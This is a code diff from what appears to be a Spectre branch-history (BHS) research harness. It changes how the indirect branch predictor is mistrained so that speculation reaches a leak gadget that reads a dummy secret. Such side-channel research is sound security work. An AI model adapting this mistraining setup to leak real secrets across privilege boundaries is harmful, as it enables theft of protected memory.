@@ -2,7 +2,7 @@
 
 struct argp_child argp_child_test[] = {0};
 
-void walk_evset();
+void mistrain();
 
 uint64_t *offsets_bh;
 uint64_t *targets_bh;
@@ -33,7 +33,7 @@ static bh_chain_params_t chain_bhs_safe = {
 
 static bh_chain_params_t chain_bhs_leak = {
     .bh_tramp_p = &tramp_br,
-    .ib_target = &t_leak,
+    .ib_target = &t_empty,
     .bh_args_p = &targets_bh,
     .nr_bh_cond_p = &args.nr_cond_bh,
     .nr_bh_ind_p = &args.nr_ind_bh,
@@ -61,14 +61,15 @@ static bh_chain_params_t chain_bhs_test = {
 
 test_obj_t test_spec_bhs = {
     .nr_repeat = NR_TEST_ITER,
-    .nr_train_passes = 4,
+    .nr_train_passes = 1,
     .nr_train_chains = 2,
-    .train_chains = (bh_chain_params_t *[]){&chain_bhs_leak, &chain_bhs_safe, &chain_bhs_safe},
+    // .train_chains = (bh_chain_params_t *[]){&chain_bhs_leak, &chain_bhs_safe},
+    .train_chains = (bh_chain_params_t *[]){&chain_bhs_safe, &chain_bhs_leak},
     .test_chain = &chain_bhs_test,
     .nr_dc_flush = 2,
     .dc_flush = (void **)&bhs_dc_flush,
     .before_train = &t_empty,
-    .before_test = &walk_evset,
+    .before_test = &mistrain,
     .nr_probes = 2,
     .probes_p = (char *[]){DUMMY_SECRET_P, DUMMY_SECRET_ALT_P},
     .description = "Different BH with Spectre-BHS"
@@ -103,12 +104,12 @@ void free_test_bh_chains()
     free(targets_bh);
 }
 
-void walk_evset()
+void mistrain()
 {
     OPS_BARRIER(0x10);
-    void *ib_ptr_empty = &t_empty;
+    void *ib_ptr_empty = &t_leak;
     for (int i = 0; i < args.nr_evset; i++)
-        goto_chain(tramp_br->jit_mem->call_entry, targets_btb_bh_evset[i], &ib_ptr_empty, args.nr_for_bh, frbuf, DUMMY_SECRET_P, 1, (char**)argv_bhs_safe);
+        goto_chain(tramp_br->jit_mem->call_entry, targets_btb_bh_evset[i], &ib_ptr_empty, COND_FP_BITS, frbuf, DUMMY_SECRET_P, 1, (char**)argv_bhs_leak);
     OPS_BARRIER(0x10);
 }
 
